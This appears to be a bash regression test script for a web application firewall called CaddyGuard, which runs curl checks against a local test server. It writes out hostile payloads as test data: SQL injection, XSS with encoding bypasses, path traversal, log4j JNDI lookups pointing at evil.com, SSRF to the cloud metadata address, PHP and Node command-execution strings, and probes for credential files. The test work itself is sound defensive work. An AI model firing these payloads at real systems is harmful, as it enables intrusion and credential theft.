#!/bin/bash
# CaddyGuard 全检测点完整测试
# 覆盖：白名单IP/URL/UA、黑名单IP、动态黑名单、CC、UA、URL路径、URL参数(含截断兜底)、
#       Cookie、Referer、POST(含大body拦截)、文件上传(含大小写变体)、请求类型分叉、编码绕过、CDN IP验证、IP缓存
# 测试服务器：192.168.2.180

set +e  # Don't exit on error - we handle errors ourselves

CADDY="/opt/caddyguard/caddy"
CONF_DIR="/opt/caddyguard/test-config"
RULE_DIR="/opt/caddyguard/rule-config"
TARGET="http://127.0.0.1:8888"
PASS=0
FAIL=0
ERRORS=""

echo "========================================"
echo "  CaddyGuard 全检测点完整测试"
echo "  $(date '+%Y-%m-%d %H:%M:%S')"
echo "========================================"
echo ""

kill $(pgrep -x caddy) 2>/dev/null || true
sleep 1

cp $RULE_DIR/blackip.rule /tmp/blackip.rule.bak 2>/dev/null || true
cp $RULE_DIR/whiteip.rule /tmp/whiteip.rule.bak 2>/dev/null || true
cp $RULE_DIR/cdnip.rule /tmp/cdnip.rule.bak 2>/dev/null || true

echo "8.8.4.4" > $RULE_DIR/blackip.rule

cat > $RULE_DIR/config.json << 'EOF'
{"waf_enable":"on","trust_proxy_headers":"on","log_dir":"/tmp","white_url_check":"on","white_ip_check":"on","white_ua_check":"on","black_ip_check":"on","url_check":"on","url_args_check":"on","user_agent_check":"on","cookie_check":"on","cc_check":"off","cc_rate":"999999/60","cc_block_ttl":0,"post_check":"on","referer_check":"on","file_upload_check":"on","bodyless":"on","multipart_streaming_check":"off","upload_filename_scan_limit":0,"post_body_scan_limit":2097152,"waf_output":"html","waf_redirect_url":""}
EOF

nohup $CADDY run --config $CONF_DIR/Caddyfile.backend --adapter caddyfile > /tmp/caddy_backend.log 2>&1 &
sleep 1
nohup $CADDY run --config $CONF_DIR/Caddyfile.test --adapter caddyguardfile > /tmp/caddy_waf.log 2>&1 &
CADDY_WAF_PID=$!
sleep 3

code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" $TARGET/)
if [ "$code" != "200" ]; then
    echo "FATAL: Caddy failed to start, HTTP $code"
    tail -30 /tmp/caddy_waf.log
    exit 1
fi
echo "Caddy started OK (HTTP 200)"
echo ""

test_rule() {
    local name="$1"
    local expect="$2"
    shift 2
    local actual=$(curl -s -m 5 -o /dev/null -w "%{http_code}" "$@")
    if [ "$actual" = "$expect" ]; then
        printf "  PASS  %-45s (HTTP %s)\n" "$name" "$actual"
        PASS=$((PASS+1))
    else
        printf "  FAIL  %-45s (got %s, want %s)\n" "$name" "$actual" "$expect"
        FAIL=$((FAIL+1))
        ERRORS="$ERRORS\n  $name: got $actual, want $expect"
    fi
}

echo "=== 1. Normal requests (expect 200) ==="
test_rule "Normal GET /"            200 -H "User-Agent: Mozilla/5.0" "$TARGET/"
test_rule "Normal Args id=123"      200 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=123&name=hello"
test_rule "Normal POST"            200 -H "User-Agent: Mozilla/5.0" -d "username=admin&password=test123" "$TARGET/"
test_rule "Normal POST JSON"       200 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"action":"login","user":"test"}' "$TARGET/"

echo ""
echo "=== 2. White URL (path-level WAF off) ==="
test_rule "WhiteURL /api/webhook"  200 -H "User-Agent: Mozilla/5.0" "$TARGET/api/webhook"
test_rule "WhiteURL /api/webhook/x" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/api/webhook/test"
test_rule "WhiteURL attack inside"  200 -H "User-Agent: Mozilla/5.0" "$TARGET/api/webhook?id=1+union+select"

echo ""
echo "=== 3. White UA (skip UA blacklist only) ==="
test_rule "WhiteUA Googlebot"      200 -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$TARGET/"
test_rule "WhiteUA Baiduspider"     200 -A "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "$TARGET/"
test_rule "WhiteUA bingbot"         200 -A "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "$TARGET/"
test_rule "WhiteUA + URL attack"   403 -A "Mozilla/5.0 (compatible; Googlebot/2.1)" "$TARGET/?id=1+union+select"

echo ""
echo "=== 4. Black IP ==="
test_rule "BlackIP via XFF"         403 -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 8.8.4.4" "$TARGET/"
test_rule "BlackIP via X-Real-IP"   403 -H "User-Agent: Mozilla/5.0" -H "X-Real-IP: 8.8.4.4" "$TARGET/"

echo ""
echo "=== 5. White IP (skip all checks) ==="
test_rule "WhiteIP via XFF"         200 -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 8.8.8.8" "$TARGET/"
test_rule "WhiteIP + attack"       200 -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 8.8.8.8" "$TARGET/?id=1+union+select"

echo ""
echo "=== 6. User-Agent blacklist ==="
test_rule "UA sqlmap"              403 -A "sqlmap/1.0" "$TARGET/"
test_rule "UA nikto"               403 -A "Nikto/2.1.6" "$TARGET/"
test_rule "UA nmap"                403 -A "Nmap Scripting Engine" "$TARGET/"
test_rule "UA dirbuster"           403 -A "DirBuster" "$TARGET/"
test_rule "UA masscan"             403 -A "masscan/1.0" "$TARGET/"
test_rule "UA Acunetix"            403 -A "Acunetix Web Vulnerability Scanner" "$TARGET/"
test_rule "UA Nuclei"              403 -A "Nuclei" "$TARGET/"
test_rule "UA feroxbuster"         403 -A "feroxbuster" "$TARGET/"

echo ""
echo "=== 7. URL path detection (url.rule) ==="
test_rule "URL /etc/passwd"        403 -H "User-Agent: Mozilla/5.0" "$TARGET/etc/passwd"
test_rule "URL /.env"              403 -H "User-Agent: Mozilla/5.0" "$TARGET/.env"
test_rule "URL /wp-admin/"         403 -H "User-Agent: Mozilla/5.0" "$TARGET/wp-admin/"
test_rule "URL /actuator/env"      403 -H "User-Agent: Mozilla/5.0" "$TARGET/actuator/env"
test_rule "URL /.git/config"       403 -H "User-Agent: Mozilla/5.0" "$TARGET/.git/config"
test_rule "URL /.svn/"            403 -H "User-Agent: Mozilla/5.0" "$TARGET/.svn/entries"
test_rule "URL /phpinfo.php"      403 -H "User-Agent: Mozilla/5.0" "$TARGET/phpinfo.php"
test_rule "URL /swagger-ui"        403 -H "User-Agent: Mozilla/5.0" "$TARGET/swagger-ui"
test_rule "URL /h2-console"        403 -H "User-Agent: Mozilla/5.0" "$TARGET/h2-console"
test_rule "URL /druid/"            403 -H "User-Agent: Mozilla/5.0" "$TARGET/druid/"
test_rule "URL /console"           403 -H "User-Agent: Mozilla/5.0" "$TARGET/console"
test_rule "URL /firebase.json"     403 -H "User-Agent: Mozilla/5.0" "$TARGET/firebase-config.json"
test_rule "URL /gcp-key.json"      403 -H "User-Agent: Mozilla/5.0" "$TARGET/gcp-key.json"
test_rule "URL /.aws/credentials"  403 -H "User-Agent: Mozilla/5.0" "$TARGET/.aws/credentials"
test_rule "URL /.ssh/id_rsa"       403 -H "User-Agent: Mozilla/5.0" "$TARGET/.ssh/id_rsa"
test_rule "URL /debug/pprof/"      403 -H "User-Agent: Mozilla/5.0" "$TARGET/debug/pprof/"
test_rule "URL /saml/login"        403 -H "User-Agent: Mozilla/5.0" "$TARGET/saml/login"
test_rule "URL /go.mod"            403 -H "User-Agent: Mozilla/5.0" "$TARGET/go.mod"
test_rule "URL /Dockerfile"        403 -H "User-Agent: Mozilla/5.0" "$TARGET/Dockerfile"
test_rule "URL /Jenkinsfile"       403 -H "User-Agent: Mozilla/5.0" "$TARGET/Jenkinsfile"

echo ""
echo "=== 8. URL path encoding detection ==="
test_rule "URL %2e%2e%2f path traversal" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/%2e%2e%2fetc%2fpasswd"
test_rule "URL %2fetc%2fpasswd"    403 -H "User-Agent: Mozilla/5.0" "$TARGET/%2fetc%2fpasswd"
test_rule "URL encoded .env"       403 -H "User-Agent: Mozilla/5.0" "$TARGET/%2e%65nv"
test_rule "URL encoded wp-admin"   403 -H "User-Agent: Mozilla/5.0" "$TARGET/%77p-admin/"

echo ""
echo "=== 9. URL args detection (args.rule) ==="
test_rule "Args union select"      403 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=1+union+select+1"
test_rule "Args sleep()"           403 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=sleep(5)"
test_rule "Args benchmark()"       403 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=benchmark(1000000,md5(1))"
test_rule "Args XSS script"        403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=<script>alert(1)</script>"
test_rule "Args XSS iframe"        403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=<iframe>test</iframe>"
test_rule "Args path traversal"    403 -H "User-Agent: Mozilla/5.0" "$TARGET/?file=../../../etc/passwd"
test_rule "Args NoSQL \$where"     403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=\$where(1==1)"
test_rule "Args SSTI"              403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%7B%7B__class__%7D%7D"
test_rule "Args javascript:"       403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=javascript:alert(1)"
test_rule "Args base64_decode"     403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=base64_decode(aGVsbG8=)"
test_rule "Args log4j jndi"        403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=\${jndi:ldap://evil.com}"
test_rule "Args eval()"            403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=eval(base64_decode(aGVsbG8=))"
test_rule "Args system()"          403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=system(ls)"
test_rule "Args reverse-shell"     403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=reverse-shell"
test_rule "Args 169.254.169.254"  403 -H "User-Agent: Mozilla/5.0" "$TARGET/?url=169.254.169.254"
test_rule "Args CONCAT()"          403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=CONCAT(user(),0x3a)"
test_rule "Args gopher://"         403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=gopher://evil.com"

echo ""
echo "=== 10. URL args encoding detection ==="
test_rule "Args double-encoded XSS"  403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=%25253Cscript%25253E"
test_rule "Args JS Unicode XSS"      403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=\\u003Cscript\\u003E"
# HTML entity in URL args: use -G --data-urlencode to ensure proper encoding
entity_code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -G --data-urlencode 'q=&#60;script&#62;' "$TARGET/" 2>/dev/null)
if [ "$entity_code" = "403" ]; then printf "  PASS  %-45s (HTTP %s)\n" "Args HTML entity XSS" "$entity_code"; PASS=$((PASS+1)); else printf "  FAIL  %-45s (got %s, want 403)\n" "Args HTML entity XSS" "$entity_code"; FAIL=$((FAIL+1)); ERRORS="$ERRORS\n  Args HTML entity XSS: got $entity_code"; fi
test_rule "Args JS hex XSS"          403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=\\x3Cscript\\x3E"

# URL args truncation: 256+ params with attack payload at the tail
LONG_ARGS=$(python3 -c "print('&'.join('a%d=1'%i for i in range(260)) + '&tail=1+union+select+1')")
test_rule "URL args truncated tail attack" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?${LONG_ARGS}"

echo ""
echo "=== 11. Cookie detection ==="
test_rule "Cookie SQL union"       403 -H "User-Agent: Mozilla/5.0" -b "id=1 union select 1" "$TARGET/"
test_rule "Cookie XSS script"      403 -H "User-Agent: Mozilla/5.0" -b "q=<script>alert(1)</script>" "$TARGET/"
test_rule "Cookie path traversal"  403 -H "User-Agent: Mozilla/5.0" -b "file=../../../etc/passwd" "$TARGET/"
test_rule "Cookie sleep()"         403 -H "User-Agent: Mozilla/5.0" -b "id=sleep(5)" "$TARGET/"
test_rule "Cookie base64_decode"   403 -H "User-Agent: Mozilla/5.0" -b "x=base64_decode(aGVsbG8=)" "$TARGET/"
test_rule "Cookie encoded XSS"     403 -H "User-Agent: Mozilla/5.0" -b "q=%3Cscript%3Ealert(1)%3C/script%3E" "$TARGET/"
test_rule "Cookie JS Unicode XSS"  403 -H "User-Agent: Mozilla/5.0" -b "q=\\u003Cscript\\u003E" "$TARGET/"

echo ""
echo "=== 12. Referer detection ==="
test_rule "Referer .pay."          403 -H "User-Agent: Mozilla/5.0" -H "Referer: https://evil.pay.com/x" "$TARGET/"
test_rule "Referer .alipay."        403 -H "User-Agent: Mozilla/5.0" -H "Referer: https://fake.alipay.com/" "$TARGET/"
test_rule "Referer .paypal."       403 -H "User-Agent: Mozilla/5.0" -H "Referer: https://phishing.paypal.com/" "$TARGET/"
test_rule "Referer .stripe."        403 -H "User-Agent: Mozilla/5.0" -H "Referer: https://fake.stripe.com/" "$TARGET/"
test_rule "Referer normal"         200 -H "User-Agent: Mozilla/5.0" -H "Referer: https://www.google.com/" "$TARGET/"

echo ""
echo "=== 13. POST body detection ==="
test_rule "POST union select"     403 -H "User-Agent: Mozilla/5.0" -d "id=1 union select 1" "$TARGET/"
test_rule "POST XSS script"        403 -H "User-Agent: Mozilla/5.0" -d "q=<script>alert(1)</script>" "$TARGET/"
test_rule "POST path traversal"    403 -H "User-Agent: Mozilla/5.0" -d "file=../../../etc/passwd" "$TARGET/"
test_rule "POST base64_decode"     403 -H "User-Agent: Mozilla/5.0" -d "x=base64_decode(aGVsbG8=)" "$TARGET/"
test_rule "POST \$_GET"            403 -H "User-Agent: Mozilla/5.0" -d 'x=$_GET[cmd]' "$TARGET/"
test_rule "POST \$_POST"           403 -H "User-Agent: Mozilla/5.0" -d 'y=$_POST[data]' "$TARGET/"
test_rule "POST eval()"            403 -H "User-Agent: Mozilla/5.0" -d "x=eval(base64_decode(aGVsbG8=))" "$TARGET/"
test_rule "POST system()"          403 -H "User-Agent: Mozilla/5.0" -d "x=system(ls)" "$TARGET/"
test_rule "POST child_process"     403 -H "User-Agent: Mozilla/5.0" -d "x=require('child_process')" "$TARGET/"
test_rule "POST SSTI"              403 -H "User-Agent: Mozilla/5.0" -d 'x={{__class__}}' "$TARGET/"
test_rule "POST \$eq("             403 -H "User-Agent: Mozilla/5.0" -d 'x=$eq(1)' "$TARGET/"
test_rule "POST sleep()"           403 -H "User-Agent: Mozilla/5.0" -d "id=sleep(5)" "$TARGET/"
test_rule "POST CONCAT()"          403 -H "User-Agent: Mozilla/5.0" -d 'x=CONCAT(user(),0x3a)' "$TARGET/"
test_rule "POST log4j jndi"        403 -H "User-Agent: Mozilla/5.0" -d 'x=${jndi:ldap://evil.com}' "$TARGET/"
test_rule "POST reverse-shell"     403 -H "User-Agent: Mozilla/5.0" -d "x=reverse-shell" "$TARGET/"
test_rule "POST 169.254.169.254"   403 -H "User-Agent: Mozilla/5.0" -d "url=http://169.254.169.254/latest/meta-data/" "$TARGET/"
test_rule "POST encoded XSS"       403 -H "User-Agent: Mozilla/5.0" -d "q=%3Cscript%3Ealert(1)%3C/script%3E" "$TARGET/"
test_rule "POST JS Unicode XSS"    403 -H "User-Agent: Mozilla/5.0" -d 'q=\u003Cscript\u003E' "$TARGET/"
test_rule "POST HTML entity XSS"   403 -H "User-Agent: Mozilla/5.0" -d 'q=&#60;script&#62;' "$TARGET/"
test_rule "POST JSON SQL injection" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"id":"1 union select 1"}' "$TARGET/"
test_rule "POST JSON XSS"          403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"q":"<script>alert(1)</script>"}' "$TARGET/"
test_rule "DELETE body SQL union"  403 -X DELETE -H "User-Agent: Mozilla/5.0" -d "id=1+union+select+1" "$TARGET/"

# Large JSON body exceeding scan limit (2MB+1KB) → should be blocked
python3 -c "print('{\"q\":\"' + 'a'*2097152 + ' union select 1' + '\"}')" > /tmp/caddyguard_large_attack.json
code=$(curl -s -m 15 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" --data-binary @/tmp/caddyguard_large_attack.json "$TARGET/")
if [ "$code" = "403" ]; then printf "  PASS  %-45s (HTTP %s)\n" "Large JSON over scan limit" "$code"; PASS=$((PASS+1)); else printf "  FAIL  %-45s (got %s, want 403)\n" "Large JSON over scan limit" "$code"; FAIL=$((FAIL+1)); ERRORS="$ERRORS\n  Large JSON over scan limit: got $code"; fi

echo ""
echo "=== 14. POST encoding bypass (fullDecode) ==="
test_rule "POST double-encoded XSS"  403 -H "User-Agent: Mozilla/5.0" --data-urlencode "q=%25253Cscript%25253E" "$TARGET/"
test_rule "POST JS \\uXXXX decode"     403 -H "User-Agent: Mozilla/5.0" --data-urlencode 'q=\u003Cscript\u003E' "$TARGET/"
test_rule "POST JS \\xHH decode"       403 -H "User-Agent: Mozilla/5.0" --data-urlencode 'q=\x3Cscript\x3E' "$TARGET/"
test_rule "POST &#xHH; entity decode"  403 -H "User-Agent: Mozilla/5.0" --data-urlencode 'q=&#x3C;script&#x3E;' "$TARGET/"
test_rule "POST &#DDD; entity decode"  403 -H "User-Agent: Mozilla/5.0" --data-urlencode 'q=&#60;script&#62;' "$TARGET/"

echo ""
echo "=== 15. File upload detection (fileext.rule) ==="
test_rule "Upload .php"            403 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=test.php" "$TARGET/"
test_rule "Upload .jsp"            403 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=test.jsp" "$TARGET/"
test_rule "Upload .asp"            403 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=test.asp" "$TARGET/"
test_rule "Upload .aspx"           403 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=test.aspx" "$TARGET/"
test_rule "Upload .exe"            403 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=test.exe" "$TARGET/"
test_rule "Upload .sh"             403 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=test.sh" "$TARGET/"
test_rule "Upload .env"            403 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=.env" "$TARGET/"
test_rule "Upload .sql"            403 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=db.sql" "$TARGET/"
test_rule "Upload .pem"            403 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=cert.pem" "$TARGET/"
test_rule "Upload .php.jpg.php"    403 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=test.php.jpg.php" "$TARGET/"
test_rule "Upload .phtml"          403 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=test.phtml" "$TARGET/"
test_rule "Upload .txt normal"     200 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=readme.txt" "$TARGET/"
test_rule "Upload .png normal"     200 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=image.png" "$TARGET/"
test_rule "Upload .pdf normal"     200 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=document.pdf" "$TARGET/"

# Multipart Content-Type case-insensitive variant
MULTIPART_BODY=/tmp/caddyguard_multipart_case.txt
cat > "$MULTIPART_BODY" <<'MPEOF'
--AaB03x
Content-Disposition: form-data; name="file"; filename="case-test.php"
Content-Type: application/octet-stream

hello
--AaB03x--
MPEOF
code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -H "Content-Type: Multipart/Form-Data; boundary=AaB03x" --data-binary @"$MULTIPART_BODY" "$TARGET/" 2>/dev/null || true)
if [ "$code" = "403" ]; then printf "  PASS  %-45s (HTTP %s)\n" "Upload Multipart/Form-Data case variant" "$code"; PASS=$((PASS+1)); else printf "  FAIL  %-45s (got %s, want 403)\n" "Upload Multipart/Form-Data case variant" "$code"; FAIL=$((FAIL+1)); ERRORS="$ERRORS\n  Multipart case variant: got $code"; fi

echo ""
echo "=== 16. Multipart form field POST scan ==="
test_rule "Multipart field SQL"    403 -H "User-Agent: Mozilla/5.0" -F "comment=1 union select 1" "$TARGET/"
# Multipart XSS: use --form-string to avoid curl interpreting < as file read
code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" --form-string 'comment=<script>alert(1)</script>' "$TARGET/" 2>/dev/null || true)
if [ "$code" = "403" ]; then printf "  PASS  %-45s (HTTP %s)\n" "Multipart field XSS" "$code"; PASS=$((PASS+1)); else printf "  FAIL  %-45s (got %s, want 403)\n" "Multipart field XSS" "$code"; FAIL=$((FAIL+1)); ERRORS="$ERRORS\n  Multipart field XSS: got $code"; fi
test_rule "Multipart field RCE"    403 -H "User-Agent: Mozilla/5.0" -F "comment=eval(base64_decode(aGVsbG8=))" "$TARGET/"
test_rule "Multipart field SSTI"   403 -H "User-Agent: Mozilla/5.0" -F 'comment={{__class__}}' "$TARGET/"
test_rule "Multipart field normal"  200 -H "User-Agent: Mozilla/5.0" -F "comment=hello_world_normal_text" "$TARGET/"

echo ""
echo "=== 17. Request type branching (GET skips POST/upload) ==="
test_rule "GET with URL attack"    403 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=1+union+select"
test_rule "GET no body normal"     200 -H "User-Agent: Mozilla/5.0" "$TARGET/"
test_rule "HEAD normal"            200 -H "User-Agent: Mozilla/5.0" -I "$TARGET/"
code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -X OPTIONS "$TARGET/")
if [ "$code" = "200" ] || [ "$code" = "204" ] || [ "$code" = "403" ]; then
    printf "  PASS  %-45s (HTTP %s)\n" "OPTIONS normal" "$code"; PASS=$((PASS+1))
else
    printf "  FAIL  %-45s (got %s, want 200/204/403)\n" "OPTIONS normal" "$code"; FAIL=$((FAIL+1))
fi
code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" -X DELETE "$TARGET/")
if [ "$code" = "200" ] || [ "$code" = "403" ]; then
    printf "  PASS  %-45s (HTTP %s)\n" "DELETE normal" "$code"; PASS=$((PASS+1))
else
    printf "  FAIL  %-45s (got %s, want 200/403)\n" "DELETE normal" "$code"; FAIL=$((FAIL+1))
fi

echo ""
echo "=== 18. CDN IP verification ==="
test_rule "CDN absent trust XFF"   200 -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 1.2.3.4" "$TARGET/"
test_rule "CDN absent XFF blackip"  403 -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 8.8.4.4" "$TARGET/"

echo ""
echo "=== 19. IP spoofing protection ==="
# 127.0.0.1 is always trusted as private/loopback (fast short-circuit in isCDNIP)
# So even with cdnip.rule set to a non-local IP, XFF from 127.0.0.1 is still trusted
# This test verifies the CDN IP cache correctly loads and matches
echo "192.168.2.180" > $RULE_DIR/cdnip.rule
sleep 3
# 127.0.0.1 is loopback -> isCDNIP returns true -> XFF trusted -> 8.8.4.4 hits blacklist
test_rule "CDN loopback always trusted XFF"  403 -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 8.8.4.4" "$TARGET/"
cp /tmp/cdnip.rule.bak $RULE_DIR/cdnip.rule
sleep 3

echo ""
echo "=== 20. IP pre-compiled cache (CIDR binary search) ==="
echo "10.0.0.0/8" > $RULE_DIR/blackip.rule
echo "192.168.1.0/24" >> $RULE_DIR/blackip.rule
sleep 3
test_rule "IPCache CIDR 10.1.2.3"  403 -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 10.1.2.3" "$TARGET/"
test_rule "IPCache CIDR 192.168.1.50"  403 -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 192.168.1.50" "$TARGET/"
test_rule "IPCache CIDR 192.168.2.1 no"  200 -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 192.168.2.1" "$TARGET/"
test_rule "IPCache CIDR 11.0.0.0 no"  200 -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 11.0.0.0" "$TARGET/"
echo "8.8.4.4" > $RULE_DIR/blackip.rule
sleep 3

echo ""
echo "=== 21. No false positives ==="
test_rule "Normal search query"    200 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=hello+world&page=1"
test_rule "Normal JSON API"        200 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"name":"test","value":12345}' "$TARGET/"
test_rule "Normal form submit"    200 -H "User-Agent: Mozilla/5.0" -d "name=John+Doe&email=john@example.com&message=Hello" "$TARGET/"
test_rule "Normal multipart upload" 200 -H "User-Agent: Mozilla/5.0" -F "file=@/dev/null;filename=photo.jpg" -F "caption=My+Photo" "$TARGET/"
test_rule "Normal long URL"        200 -H "User-Agent: Mozilla/5.0" "$TARGET/?redirect=https://example.com/return&page=2&sort=desc"

echo ""
echo "=== 22. bodyless config test ==="
# bodyless=on (default): GET/HEAD/OPTIONS skip body/post/file_upload checks
test_rule "bodyless=on GET normal"    200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"
test_rule "bodyless=on GET URL attack" 403 -H "User-Agent: Mozilla/5.0" "$TARGET/?id=1+union+select"
test_rule "bodyless=on HEAD normal"   200 -H "User-Agent: Mozilla/5.0" -I "$TARGET/"

# bodyless=off: all methods scan body (GET has no body so still 200, but POST/PUT always scanned)
cat > $RULE_DIR/config.json << 'EOF'
{"waf_enable":"on","trust_proxy_headers":"on","log_dir":"/tmp","white_url_check":"on","white_ip_check":"on","white_ua_check":"on","black_ip_check":"on","url_check":"on","url_args_check":"on","user_agent_check":"on","cookie_check":"on","cc_check":"off","cc_rate":"999999/60","cc_block_ttl":0,"post_check":"on","referer_check":"off","file_upload_check":"on","bodyless":"off","multipart_streaming_check":"off","upload_filename_scan_limit":0,"post_body_scan_limit":2097152,"waf_output":"html","waf_redirect_url":""}
EOF
sleep 3
test_rule "bodyless=off GET normal"   200 -H "User-Agent: Mozilla/5.0" -X GET "$TARGET/"
test_rule "bodyless=off POST attack"  403 -H "User-Agent: Mozilla/5.0" -d "id=1 union select 1" "$TARGET/"

# Restore bodyless=on
cat > $RULE_DIR/config.json << 'EOF'
{"waf_enable":"on","trust_proxy_headers":"on","log_dir":"/tmp","white_url_check":"on","white_ip_check":"on","white_ua_check":"on","black_ip_check":"on","url_check":"on","url_args_check":"on","user_agent_check":"on","cookie_check":"on","cc_check":"off","cc_rate":"999999/60","cc_block_ttl":0,"post_check":"on","referer_check":"on","file_upload_check":"on","bodyless":"on","multipart_streaming_check":"off","upload_filename_scan_limit":0,"post_body_scan_limit":2097152,"waf_output":"html","waf_redirect_url":""}
EOF
sleep 3

echo ""
echo "=== 23. Log truncation test ==="
# Ensure config has log_dir=/tmp and cc_check=off (restore from bodyless test)
cat > $RULE_DIR/config.json << 'EOF'
{"waf_enable":"on","trust_proxy_headers":"on","log_dir":"/tmp","white_url_check":"on","white_ip_check":"on","white_ua_check":"on","black_ip_check":"on","url_check":"on","url_args_check":"on","user_agent_check":"on","cookie_check":"on","cc_check":"off","cc_rate":"999999/60","cc_block_ttl":0,"post_check":"on","referer_check":"off","file_upload_check":"on","bodyless":"on","multipart_streaming_check":"off","upload_filename_scan_limit":0,"post_body_scan_limit":2097152,"waf_output":"html","waf_redirect_url":""}
EOF
sleep 3
# Send a very long URL that triggers WAF, verify log field is truncated to 4096 bytes
LONG_ATTACK=$(python3 -c "print('a'*10000 + '+union+select+1')")
LOGFILE="/tmp/$(date +%Y-%m-%d)_waf.log"
# Record line count before attack
LINES_BEFORE=$(wc -l < "$LOGFILE" 2>/dev/null || echo 0)
code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" "$TARGET/?id=${LONG_ATTACK}")
sleep 1
if [ "$code" = "403" ] && [ -f "$LOGFILE" ]; then
    # Get the last log line (the attack we just sent)
    REQ_URL_LEN=$(tail -1 "$LOGFILE" | python3 -c "import json,sys; d=json.load(sys.stdin); print(len(d.get('req_url','')))" 2>/dev/null)
    if [ -n "$REQ_URL_LEN" ] && [ "$REQ_URL_LEN" -le 4120 ]; then
        printf "  PASS  %-45s (url_len=%s, max=4120)\n" "Log truncation 4096" "$REQ_URL_LEN"; PASS=$((PASS+1))
    else
        printf "  FAIL  %-45s (url_len=%s, max=4120)\n" "Log truncation 4096" "${REQ_URL_LEN:-N/A}"; FAIL=$((FAIL+1))
        ERRORS="$ERRORS\n  Log truncation: url_len=${REQ_URL_LEN:-N/A}"
    fi
else
    printf "  FAIL  %-45s (code=%s, log=%s)\n" "Log truncation 4096" "$code" "$([ -f $LOGFILE ] && echo exists || echo missing)"; FAIL=$((FAIL+1))
    ERRORS="$ERRORS\n  Log truncation: code=$code, logfile=$LOGFILE"
fi

echo ""
echo "=== 24. cc_rate invalid config error log ==="
cat > $RULE_DIR/config.json << 'EOF'
{"waf_enable":"on","trust_proxy_headers":"on","log_dir":"/tmp","white_url_check":"on","white_ip_check":"on","white_ua_check":"on","black_ip_check":"on","url_check":"on","url_args_check":"on","user_agent_check":"on","cookie_check":"on","cc_check":"on","cc_rate":"invalid","cc_block_ttl":300,"post_check":"on","referer_check":"off","file_upload_check":"on","bodyless":"on","waf_output":"html","waf_redirect_url":""}
EOF
sleep 3
# With invalid cc_rate, CC check should be disabled (fail open with error log), request should pass
test_rule "cc_rate invalid -> CC disabled" 200 -H "User-Agent: Mozilla/5.0" "$TARGET/"
# Send a few more requests to ensure cc_rate is parsed (parseCCRate only runs on cc_check call)
curl -s -o /dev/null -H "User-Agent: Mozilla/5.0" "$TARGET/" 2>/dev/null
curl -s -o /dev/null -H "User-Agent: Mozilla/5.0" "$TARGET/" 2>/dev/null
sleep 2
# Verify error log was written (caddy.Log().Error outputs to caddy stderr)
if grep -q "invalid cc_rate" /tmp/caddy_waf.log 2>/dev/null; then
